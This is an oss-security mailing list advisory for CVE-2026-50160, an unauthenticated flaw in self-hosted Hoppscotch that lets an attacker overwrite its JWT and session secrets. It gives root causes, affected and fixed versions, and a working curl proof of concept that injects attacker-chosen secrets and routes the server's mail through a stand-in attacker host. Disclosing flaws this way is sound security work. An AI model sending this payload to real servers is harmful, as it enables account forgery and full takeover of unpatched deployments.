X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/06/23/7
Message-ID: <CAAZhgk6BLONS0YuZmkCiAt7_Cg96AQ87bGdD8DQUueJtiRUP3A@mail.gmail.com>
Date: Tue, 23 Jun 2026 23:07:56 +0530
From: Aditi Bhatnagar <aditi@...gridsec.com>
To: oss-security@...ts.openwall.com
Subject: [CVE-2026-50160] Hoppscotch: Unauthenticated JWT Secret Overwrite (CVSS 10.0)
Content-Type: text/plain; charset=utf-8

Hello,

We are reporting a critical vulnerability in Hoppscotch, an open source
self-hosted API development platform (79,000+ GitHub stars).

CVE:      CVE-2026-50160
CVSS:     10.0 (Critical)
GHSA:
https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-j542-4rch-8hwf
Affected: Hoppscotch self-hosted <= 2026.4.1
Fixed:    2026.5.0

Summary:

The POST /v1/onboarding/config endpoint allows an unauthenticated attacker
to inject arbitrary InfraConfig keys including JWT_SECRET and
SESSION_SECRET
into the database via mass assignment. Four independent weaknesses combine
to enable this:

1. NestJS ValidationPipe missing whitelist:true - extra request body
   properties are not stripped
2. Object.entries(dto) iterates all properties without runtime validation
3. validateEnvValues has default:break - JWT_SECRET passes silently
4. No authentication on the onboarding endpoint

An attacker controlling JWT_SECRET can forge tokens for any user including
admin, resulting in full server compromise. The attack works on any fresh
Hoppscotch deployment before onboarding completes, or when re-onboarding is
enabled.

Proof of concept:

curl -X POST http://target:3170/v1/onboarding/config \
  -H "Content-Type: application/json" \
  -d '{
    "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
    "MAILER_SMTP_ENABLE": "true",
    "MAILER_SMTP_URL": "smtp://attacker.com:25",
    "MAILER_ADDRESS_FROM": "attacker@...l.com",
    "JWT_SECRET": "ATTACKER_CONTROLLED_JWT_SECRET",
    "SESSION_SECRET": "ATTACKER_CONTROLLED_SESSION"
  }'

Fix:

Upgrade to Hoppscotch 2026.5.0. Full fix details and root cause analysis
in the advisory linked above.

Full writeup: https://www.offgridsec.com/blog-hoppscotch-cve-2026-50160.html

Reported by: Offgrid Security (https://offgridsec.com)
Found by:    Kira, model-agnostic autonomous AI security agent

